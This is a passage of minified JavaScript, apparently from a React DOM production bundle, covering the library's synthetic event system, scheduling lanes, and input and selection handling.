n.dangerouslySetInnerHTML!="object"||!("__html"in n.dangerouslySetInnerHTML))throw Error(A(61))}if(n.style!=null&&typeof n.style!="object")throw Error(A(62))}}function ga(e,n){if(e.indexOf("-")===-1)return typeof n.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var ya=null;function wl(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var va=null,Et=null,Tt=null;function To(e){if(e=Hs(e)){if(typeof va!="function")throw Error(A(280));var n=e.stateNode;n&&(n=hi(n),va(e.stateNode,e.type,n))}}function Cu(e){Et?Tt?Tt.push(e):Tt=[e]:Et=e}function Pu(){if(Et){var e=Et,n=Tt;if(Tt=Et=null,To(e),n)for(e=0;e<n.length;e++)To(n[e])}}function Au(e,n){return e(n)}function Lu(){}var Oi=!1;function Nu(e,n,t){if(Oi)return e(n,t);Oi=!0;try{return Au(e,n,t)}finally{Oi=!1,(Et!==null||Tt!==null)&&(Lu(),Pu())}}function vs(e,n){var t=e.stateNode;if(t===null)return null;var s=hi(t);if(s===null)return null;t=s[n];e:switch(n){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(s=!s.disabled)||(e=e.type,s=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!s;break e;default:e=!1}if(e)return null;if(t&&typeof t!="function")throw Error(A(231,n,typeof t));return t}var wa=!1;if(hn)try{var Gt={};Object.defineProperty(Gt,"passive",{get:function(){wa=!0}}),window.addEventListener("test",Gt,Gt),window.removeEventListener("test",Gt,Gt)}catch{wa=!1}function Rh(e,n,t,s,r,i,a,l,o){var c=Array.prototype.slice.call(arguments,3);try{n.apply(t,c)}catch(u){this.onError(u)}}var os=!1,Rr=null,Or=!1,ka=null,Oh={onError:function(e){os=!0,Rr=e}};function Mh(e,n,t,s,r,i,a,l,o){os=!1,Rr=null,Rh.apply(Oh,arguments)}function Ih(e,n,t,s,r,i,a,l,o){if(Mh.apply(this,arguments),os){if(os){var c=Rr;os=!1,Rr=null}else throw Error(A(198));Or||(Or=!0,ka=c)}}function ot(e){var n=e,t=e;if(e.alternate)for(;n.return;)n=n.return;else{e=n;do n=e,n.flags&4098&&(t=n.return),e=n.return;while(e)}return n.tag===3?t:null}function Ru(e){if(e.tag===13){var n=e.memoizedState;if(n===null&&(e=e.alternate,e!==null&&(n=e.memoizedState)),n!==null)return n.dehydrated}return null}function Co(e){if(ot(e)!==e)throw Error(A(188))}function zh(e){var n=e.alternate;if(!n){if(n=ot(e),n===null)throw Error(A(188));return n!==e?null:e}for(var t=e,s=n;;){var r=t.return;if(r===null)break;var i=r.alternate;if(i===null){if(s=r.return,s!==null){t=s;continue}break}if(r.child===i.child){for(i=r.child;i;){if(i===t)return Co(r),e;if(i===s)return Co(r),n;i=i.sibling}throw Error(A(188))}if(t.return!==s.return)t=r,s=i;else{for(var a=!1,l=r.child;l;){if(l===t){a=!0,t=r,s=i;break}if(l===s){a=!0,s=r,t=i;break}l=l.sibling}if(!a){for(l=i.child;l;){if(l===t){a=!0,t=i,s=r;break}if(l===s){a=!0,s=i,t=r;break}l=l.sibling}if(!a)throw Error(A(189))}}if(t.alternate!==s)throw Error(A(190))}if(t.tag!==3)throw Error(A(188));return t.stateNode.current===t?e:n}function Ou(e){return e=zh(e),e!==null?Mu(e):null}function Mu(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var n=Mu(e);if(n!==null)return n;e=e.sibling}return null}var Iu=Ne.unstable_scheduleCallback,Po=Ne.unstable_cancelCallback,Dh=Ne.unstable_shouldYield,jh=Ne.unstable_requestPaint,J=Ne.unstable_now,Bh=Ne.unstable_getCurrentPriorityLevel,kl=Ne.unstable_ImmediatePriority,zu=Ne.unstable_UserBlockingPriority,Mr=Ne.unstable_NormalPriority,Fh=Ne.unstable_LowPriority,Du=Ne.unstable_IdlePriority,ci=null,en=null;function Uh(e){if(en&&typeof en.onCommitFiberRoot=="function")try{en.onCommitFiberRoot(ci,e,void 0,(e.current.flags&128)===128)}catch{}}var qe=Math.clz32?Math.clz32:Wh,Hh=Math.log,Vh=Math.LN2;function Wh(e){return e>>>=0,e===0?32:31-(Hh(e)/Vh|0)|0}var Zs=64,Js=4194304;function ss(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Ir(e,n){var t=e.pendingLanes;if(t===0)return 0;var s=0,r=e.suspendedLanes,i=e.pingedLanes,a=t&268435455;if(a!==0){var l=a&~r;l!==0?s=ss(l):(i&=a,i!==0&&(s=ss(i)))}else a=t&~r,a!==0?s=ss(a):i!==0&&(s=ss(i));if(s===0)return 0;if(n!==0&&n!==s&&!(n&r)&&(r=s&-s,i=n&-n,r>=i||r===16&&(i&4194240)!==0))return n;if(s&4&&(s|=t&16),n=e.entangledLanes,n!==0)for(e=e.entanglements,n&=s;0<n;)t=31-qe(n),r=1<<t,s|=e[t],n&=~r;return s}function $h(e,n){switch(e){case 1:case 2:case 4:return n+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function Gh(e,n){for(var t=e.suspendedLanes,s=e.pingedLanes,r=e.expirationTimes,i=e.pendingLanes;0<i;){var a=31-qe(i),l=1<<a,o=r[a];o===-1?(!(l&t)||l&s)&&(r[a]=$h(l,n)):o<=n&&(e.expiredLanes|=l),i&=~l}}function ba(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function ju(){var e=Zs;return Zs<<=1,!(Zs&4194240)&&(Zs=64),e}function Mi(e){for(var n=[],t=0;31>t;t++)n.push(e);return n}function Fs(e,n,t){e.pendingLanes|=n,n!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,n=31-qe(n),e[n]=t}function qh(e,n){var t=e.pendingLanes&~n;e.pendingLanes=n,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=n,e.mutableReadLanes&=n,e.entangledLanes&=n,n=e.entanglements;var s=e.eventTimes;for(e=e.expirationTimes;0<t;){var r=31-qe(t),i=1<<r;n[r]=0,s[r]=-1,e[r]=-1,t&=~i}}function bl(e,n){var t=e.entangledLanes|=n;for(e=e.entanglements;t;){var s=31-qe(t),r=1<<s;r&n|e[s]&n&&(e[s]|=n),t&=~r}}var H=0;function Bu(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var Fu,xl,Uu,Hu,Vu,xa=!1,er=[],Ln=null,Nn=null,Rn=null,ws=new Map,ks=new Map,_n=[],Yh="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Ao(e,n){switch(e){case"focusin":case"focusout":Ln=null;break;case"dragenter":case"dragleave":Nn=null;break;case"mouseover":case"mouseout":Rn=null;break;case"pointerover":case"pointerout":ws.delete(n.pointerId);break;case"gotpointercapture":case"lostpointercapture":ks.delete(n.pointerId)}}function qt(e,n,t,s,r,i){return e===null||e.nativeEvent!==i?(e={blockedOn:n,domEventName:t,eventSystemFlags:s,nativeEvent:i,targetContainers:[r]},n!==null&&(n=Hs(n),n!==null&&xl(n)),e):(e.eventSystemFlags|=s,n=e.targetContainers,r!==null&&n.indexOf(r)===-1&&n.push(r),e)}function Xh(e,n,t,s,r){switch(n){case"focusin":return Ln=qt(Ln,e,n,t,s,r),!0;case"dragenter":return Nn=qt(Nn,e,n,t,s,r),!0;case"mouseover":return Rn=qt(Rn,e,n,t,s,r),!0;case"pointerover":var i=r.pointerId;return ws.set(i,qt(ws.get(i)||null,e,n,t,s,r)),!0;case"gotpointercapture":return i=r.pointerId,ks.set(i,qt(ks.get(i)||null,e,n,t,s,r)),!0}return!1}function Wu(e){var n=Yn(e.target);if(n!==null){var t=ot(n);if(t!==null){if(n=t.tag,n===13){if(n=Ru(t),n!==null){e.blockedOn=n,Vu(e.priority,function(){Uu(t)});return}}else if(n===3&&t.stateNode.current.memoizedState.isDehydrated){e.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}e.blockedOn=null}function yr(e){if(e.blockedOn!==null)return!1;for(var n=e.targetContainers;0<n.length;){var t=Sa(e.domEventName,e.eventSystemFlags,n[0],e.nativeEvent);if(t===null){t=e.nativeEvent;var s=new t.constructor(t.type,t);ya=s,t.target.dispatchEvent(s),ya=null}else return n=Hs(t),n!==null&&xl(n),e.blockedOn=t,!1;n.shift()}return!0}function Lo(e,n,t){yr(e)&&t.delete(n)}function Kh(){xa=!1,Ln!==null&&yr(Ln)&&(Ln=null),Nn!==null&&yr(Nn)&&(Nn=null),Rn!==null&&yr(Rn)&&(Rn=null),ws.forEach(Lo),ks.forEach(Lo)}function Yt(e,n){e.blockedOn===n&&(e.blockedOn=null,xa||(xa=!0,Ne.unstable_scheduleCallback(Ne.unstable_NormalPriority,Kh)))}function bs(e){function n(r){return Yt(r,e)}if(0<er.length){Yt(er[0],e);for(var t=1;t<er.length;t++){var s=er[t];s.blockedOn===e&&(s.blockedOn=null)}}for(Ln!==null&&Yt(Ln,e),Nn!==null&&Yt(Nn,e),Rn!==null&&Yt(Rn,e),ws.forEach(n),ks.forEach(n),t=0;t<_n.length;t++)s=_n[t],s.blockedOn===e&&(s.blockedOn=null);for(;0<_n.length&&(t=_n[0],t.blockedOn===null);)Wu(t),t.blockedOn===null&&_n.shift()}var Ct=vn.ReactCurrentBatchConfig,zr=!0;function Qh(e,n,t,s){var r=H,i=Ct.transition;Ct.transition=null;try{H=1,Sl(e,n,t,s)}finally{H=r,Ct.transition=i}}function Zh(e,n,t,s){var r=H,i=Ct.transition;Ct.transition=null;try{H=4,Sl(e,n,t,s)}finally{H=r,Ct.transition=i}}function Sl(e,n,t,s){if(zr){var r=Sa(e,n,t,s);if(r===null)Wi(e,n,s,Dr,t),Ao(e,s);else if(Xh(r,e,n,t,s))s.stopPropagation();else if(Ao(e,s),n&4&&-1<Yh.indexOf(e)){for(;r!==null;){var i=Hs(r);if(i!==null&&Fu(i),i=Sa(e,n,t,s),i===null&&Wi(e,n,s,Dr,t),i===r)break;r=i}r!==null&&s.stopPropagation()}else Wi(e,n,s,null,t)}}var Dr=null;function Sa(e,n,t,s){if(Dr=null,e=wl(s),e=Yn(e),e!==null)if(n=ot(e),n===null)e=null;else if(t=n.tag,t===13){if(e=Ru(n),e!==null)return e;e=null}else if(t===3){if(n.stateNode.current.memoizedState.isDehydrated)return n.tag===3?n.stateNode.containerInfo:null;e=null}else n!==e&&(e=null);return Dr=e,null}function $u(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Bh()){case kl:return 1;case zu:return 4;case Mr:case Fh:return 16;case Du:return 536870912;default:return 16}default:return 16}}var Cn=null,_l=null,vr=null;function Gu(){if(vr)return vr;var e,n=_l,t=n.length,s,r="value"in Cn?Cn.value:Cn.textContent,i=r.length;for(e=0;e<t&&n[e]===r[e];e++);var a=t-e;for(s=1;s<=a&&n[t-s]===r[i-s];s++);return vr=r.slice(e,1<s?1-s:void 0)}function wr(e){var n=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&n===13&&(e=13)):e=n,e===10&&(e=13),32<=e||e===13?e:0}function nr(){return!0}function No(){return!1}function Me(e){function n(t,s,r,i,a){this._reactName=t,this._targetInst=r,this.type=s,this.nativeEvent=i,this.target=a,this.currentTarget=null;for(var l in e)e.hasOwnProperty(l)&&(t=e[l],this[l]=t?t(i):i[l]);return this.isDefaultPrevented=(i.defaultPrevented!=null?i.defaultPrevented:i.returnValue===!1)?nr:No,this.isPropagationStopped=No,this}return K(n.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=nr)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=nr)},persist:function(){},isPersistent:nr}),n}var Ht={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},El=Me(Ht),Us=K({},Ht,{view:0,detail:0}),Jh=Me(Us),Ii,zi,Xt,ui=K({},Us,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Tl,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==Xt&&(Xt&&e.type==="mousemove"?(Ii=e.screenX-Xt.screenX,zi=e.screenY-Xt.screenY):zi=Ii=0,Xt=e),Ii)},movementY:function(e){return"movementY"in e?e.movementY:zi}}),Ro=Me(ui),ef=K({},ui,{dataTransfer:0}),nf=Me(ef),tf=K({},Us,{relatedTarget:0}),Di=Me(tf),sf=K({},Ht,{animationName:0,elapsedTime:0,pseudoElement:0}),rf=Me(sf),af=K({},Ht,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),lf=Me(af),of=K({},Ht,{data:0}),Oo=Me(of),cf={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},uf={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},pf={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function df(e){var n=this.nativeEvent;return n.getModifierState?n.getModifierState(e):(e=pf[e])?!!n[e]:!1}function Tl(){return df}var hf=K({},Us,{key:function(e){if(e.key){var n=cf[e.key]||e.key;if(n!=="Unidentified")return n}return e.type==="keypress"?(e=wr(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?uf[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Tl,charCode:function(e){return e.type==="keypress"?wr(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?wr(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),ff=Me(hf),mf=K({},ui,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Mo=Me(mf),gf=K({},Us,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Tl}),yf=Me(gf),vf=K({},Ht,{propertyName:0,elapsedTime:0,pseudoElement:0}),wf=Me(vf),kf=K({},ui,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),bf=Me(kf),xf=[9,13,27,32],Cl=hn&&"CompositionEvent"in window,cs=null;hn&&"documentMode"in document&&(cs=document.documentMode);var Sf=hn&&"TextEvent"in window&&!cs,qu=hn&&(!Cl||cs&&8<cs&&11>=cs),Io=" ",zo=!1;function Yu(e,n){switch(e){case"keyup":return xf.indexOf(n.keyCode)!==-1;case"keydown":return n.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Xu(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var ht=!1;function _f(e,n){switch(e){case"compositionend":return Xu(n);case"keypress":return n.which!==32?null:(zo=!0,Io);case"textInput":return e=n.data,e===Io&&zo?null:e;default:return null}}function Ef(e,n){if(ht)return e==="compositionend"||!Cl&&Yu(e,n)?(e=Gu(),vr=_l=Cn=null,ht=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(n.ctrlKey||n.altKey||n.metaKey)||n.ctrlKey&&n.altKey){if(n.char&&1<n.char.length)return n.char;if(n.which)return String.fromCharCode(n.which)}return null;case"compositionend":return qu&&n.locale!=="ko"?null:n.data;default:return null}}var Tf={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Do(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n==="input"?!!Tf[e.type]:n==="textarea"}function Ku(e,n,t,s){Cu(s),n=jr(n,"onChange"),0<n.length&&(t=new El("onChange","change",null,t,s),e.push({event:t,listeners:n}))}var us=null,xs=null;function Cf(e){lp(e,0)}function pi(e){var n=gt(e);if(ku(n))return e}function Pf(e,n){if(e==="change")return n}var Qu=!1;if(hn){var ji;if(hn){var Bi="oninput"in document;if(!Bi){var jo=document.createElement("div");jo.setAttribute("oninput","return;"),Bi=typeof jo.oninput=="function"}ji=Bi}else ji=!1;Qu=ji&&(!document.documentMode||9<document.documentMode)}function Bo(){us&&(us.detachEvent("onpropertychange",Zu),xs=us=null)}function Zu(e){if(e.propertyName==="value"&&pi(xs)){var n=[];Ku(n,xs,e,wl(e)),Nu(Cf,n)}}function Af(e,n,t){e==="focusin"?(Bo(),us=n,xs=t,us.attachEvent("onpropertychange",Zu)):e==="focusout"&&Bo()}function Lf(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return pi(xs)}function Nf(e,n){if(e==="click")return pi(n)}function Rf(e,n){if(e==="input"||e==="change")return pi(n)}function Of(e,n){return e===n&&(e!==0||1/e===1/n)||e!==e&&n!==n}var Xe=typeof Object.is=="function"?Object.is:Of;function Ss(e,n){if(Xe(e,n))return!0;if(typeof e!="object"||e===null||typeof n!="object"||n===null)return!1;var t=Object.keys(e),s=Object.keys(n);if(t.length!==s.length)return!1;for(s=0;s<t.length;s++){var r=t[s];if(!ia.call(n,r)||!Xe(e[r],n[r]))return!1}return!0}function Fo(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Uo(e,n){var t=Fo(e);e=0;for(var s;t;){if(t.nodeType===3){if(s=e+t.textContent.length,e<=n&&s>=n)return{node:t,offset:n-e};e=s}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=Fo(t)}}function Ju(e,n){return e&&n?e===n?!0:e&&e.nodeType===3?!1:n&&n.nodeType===3?Ju(e,n.parentNode):"contains"in e?e.contains(n):e.compareDocumentPosition?!!(e.compareDocumentPosition(n)&16):!1:!1}function ep(){for(var e=window,n=Nr();n instanceof e.HTMLIFrameElement;){try{var t=typeof n.contentWindow.location.href=="string"}catch{t=!1}if(t)e=n.contentWindow;else break;n=Nr(e.document)}return n}function Pl(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n&&(n==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||n==="textarea"||e.contentEditable==="true")}function Mf(e){var n=ep(),t=e.focusedElem,s=e.selectionRange;if(n!==t&&t&&t.ownerDocument&&Ju(t.ownerDocument.documentElement,t)){if(s!==null&&Pl(t)){if(n=s.start,e=s.end,e===void 0&&(e=n),"selectionStart"in t)t.selectionStart=n,t.selectionEnd=Math.min(e,t.value.length);else if(e=(n=t.ownerDocument||document)&&n.defaultView||window,e.getSelection){e=e.getSelection();var r=t.textContent.length,i=Math.min(s.start,r);s=s.end===void 0?i:Math.min(s.end,r),!e.extend&&i>s&&(r=s,s=i,i=r),r=Uo(t,i);var a=Uo(t,s);r&&a&&(e.rangeCount!==1||e.anchorNode!==r.node||e.anchorOffset!==r.offset||e.focusNode!==a.node||e.focusOffset!==a.offset)&&(n=n.createRange(),n.setStart(r.node,r.offset),e.removeAllRanges(),i>s?(e.addRange(n),e.extend(a.node,a.offset)):(n.setEnd(a.node,a.offset),e.addRange(n)))}}for(n=[],e=t;e=e.parentNode;)e.nodeType===1&&n.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof t.focus=="function"&&t.focus(),t=0;t<n.length;t++)e=n[t],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var If=hn&&"documentMode"in document&&11>=document.documentMode,ft=null,_a=null,ps=null,Ea=!1;function Ho(e,n,t){var s=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;Ea||ft==null||ft!==Nr(s)||(s=ft,"selectionStart"in s&&Pl(s)?s={start:s.selectionStart,end:s.selectionEnd}:(s=(s.ownerDocument&&s.ownerDocument.defaultView||window).getSelection(),s={anchorNode:s.anchorNode,anchorOffset:s.anchorOffset,focusNode:s.focusNode,focusOffset:s.focusOffset}),ps&&Ss(ps,s)||(ps=s,s=jr(_a,"onSelect"),0<s.length&&(n=new El("onSelect","select",null,n,t),e.push({event:n,listeners:s}),n.target=ft)))}function tr(e,n){var t={};return t[e.toLowerCase()]=n.toLowerCase(),t["Webkit"+e]="webkit"+n,t["Moz"+e]="moz"+n,t}var mt={animationend:tr("Animation","AnimationEnd"),animationiteration:tr("Animation","AnimationIteration"),animationstart:tr("Animation","AnimationStart"),transitionend:tr("Transition","TransitionEnd")},Fi={},np={};hn&&(np=document.createElement("div").style,"AnimationEvent"in window||(delete mt.animationend.animation,delete mt.animationiteration.animation,delete mt.animationstart.animation),"TransitionEvent"in window||delete mt.transitionend.transition);function di(e){if(Fi[e])return Fi[e];if(!mt[e])return e;var n=mt[e],t;for(t in n)if(n.hasOwnProperty(t)&&t in np)return Fi[e]=n[t];return e}var tp=di("animationend"),sp=di("animationiteration"),rp=di("animationstart"),ip=di("transitionend"),ap=new Map,Vo="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Un(e,n){ap.set(e,n),lt(n,[e])}for(var Ui=0;Ui<Vo.length;Ui++){var Hi=Vo[Ui],zf=Hi.toLowerCase(),Df=Hi[0].toUpperCase()+Hi.slice(1);Un(zf,"on"+Df)}Un(tp,"onAnimationEnd");Un(sp,"onAnimationIteration");Un(rp,"onAnimationStart");Un("dblclick","onDoubleClick");Un("focusin","onFocus");Un("focusout","onBlur");Un(ip,"onTransitionEnd");Rt("onMouseEnter",["mouseout","mouseover"]);Rt("onMouseLeave",["mouseout","mouseover"]);Rt("onPointerEnter",["pointerout","pointerover"]);Rt("onPointerLeave",["pointerout","pointerover"]);lt("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));lt("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));lt("onBeforeInput",["compositionend","keypress","textInput","paste"]);lt("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));lt("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));lt("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var rs="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),jf=new Set("cancel close invalid load scroll toggle".split(" ").concat(rs));function Wo(e,n,t){var s=e.type||"unknown-event";e.currentTarget=t,Ih(s,n,void 0,e),e.currentTarget=null}function lp(e,n){n=(n&4)!==0;for(var t=0;t<e.length;t++){var s=e[t],r=s.event;s=s.listeners;e:{var i=void 0;if(n)for(var a=s.length-1;0<=a;a--){var l=s[a],o=l.instance,c=l.currentTarget;if(l=l.listener,o!==i&&r.isPropagationStopped())break e;Wo(r,l,c),i=o}else for(a=0;a<s.length;a++){if(l=s[a],o=l.instance,c=l.currentTarget,l=l.listener,o!==i&&r.isPropagationStopped())break e;Wo(r,l,c),i=o}}}if(Or)throw e=ka,Or=!1,ka=null,e}function $(e,n){var t=n[La];t===void 0&&(t=n[La]=new Set);var s=e+"__bubble";t.has(s)||(op(n,e,2,!1),t.add(s))}function Vi(e,n,t){var s=0;n&&(s|=4),op(t,e,s,n)}var sr="_reactListening"+Math.random().toString(36).slice(2);function _s(e){if(!e[sr]){e[sr]=!0,mu.forEach(function(t){t!=="selectionchange"&&(jf.has(t)||Vi(t,!1,e),Vi(t,!0,e))});var n=e.nodeType===9?e:e.ownerDocument;n===null||n[sr]||(n[sr]=!0,Vi("selectionchange",!1,n))}}function op(e,n,t,s){switch($u(n)){case 1:var r=Qh;break;case 4:r=Zh;break;default:r=Sl}t=r.bind(null,n,t,e),r=void 0,!wa||n!=="touchstart"&&n!=="touchmove"&&n!=="wheel"||(r=!0),s?r!==void 0?e.addEventListener(n,t,{capture:!0,passive:r}):e.addEventListener(n,t,!0):r!==void 0?e.addEventListener(n,t,{passive:r}):e.addEventListener(n,t,!1)}function Wi(e,n,t,s,r){var i=s;if(!(n&1)&&!(n&2)&&s!==null)e:for(;;){if(s===null)return;var a=s.tag;if(a===3||a===4){var l=s.stateNode.containerInfo;if(l===r||l.nodeType===8&&l.parentNode===r)break;if(a===4)for(a=s.return;a!==null;){var o=a.tag;if((o===3||o===4)&&(o=a.stateNode.containerInfo,o===r||o.nodeType===8&&o.parentNode===r))return;a=a.return}for(;l!==null;){if(a=Yn(l),a===null)return;if(o=a.tag,o===5||o===6){s=i=a;continue e}l=l.parentNode}}s=s.return}Nu(function(){var c=i,u=wl(t),h=[];e:{var f=ap.get(e);if(f!==void 0){var v=El,b=e;switch(e){case"keypress":if(wr(t)===0)break e;case"keydown":case"keyup":v=ff;break;case"focusin":b="focus",v=Di;break;case"focusout":b="blur",v=Di;break;case"beforeblur":case"afterblur":v=Di;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":v=Ro;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":v=nf;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":v=yf;break;case tp:case sp:case rp:v=rf;break;case ip:v=wf;break;case"scroll":v=Jh;break;case"wheel":v=bf;break;case"copy":case"cut":case"paste":v=lf;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":v=Mo}var g=(n&4)!==0,x=!g&&e==="scroll",p=g?f!==null?f+"Capture":null:f;g=[];for(var d=c,m;d!==null;){m=d;var w=m.stateNode;if(m.tag===5&&w!==null&&(m=w,p!==null&&(w=vs(d,p),w!=null&&g.push(Es(d,w,m)))),x)break;d=d.return}0<g.length&&(f=new v(f,b,null,t,u),h.push({event:f,listeners:g}))}}if(!(n&7)){e:{if(f=e==="mouseover"||e==="pointerover",v=e==="mouseout"||e==="pointerout",f&&t!==ya&&(b=t.relatedTarget||t.fromElement)&&(Yn(b)||b[fn]))break 